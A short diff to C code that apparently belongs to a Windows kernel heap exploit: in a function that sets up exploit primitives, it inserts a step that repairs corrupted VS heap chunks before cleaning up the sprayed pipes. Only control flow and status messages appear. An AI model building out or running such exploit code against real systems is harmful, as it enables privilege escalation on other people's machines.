@@ -144,7 +144,14 @@ int SetupPrimitives(exploit_addresses_t* addrs)
         return 0;
     }
 
-    puts("\n## 1.5 Cleaning up pipes\n");
+    puts("\n## 1.5 Fixing VS chunks\n");
+    if (!FixVsChunks(addrs))
+    {
+        fprintf(stderr, "[-] VS chunks fix failed\n");
+        return 0;
+    }
+
+    puts("\n## 1.6 Cleaning up pipes\n");
     if (!CleanupPipes(&pipes))
     {
         fprintf(stderr, "[-] Pipes cleanup failed\n");
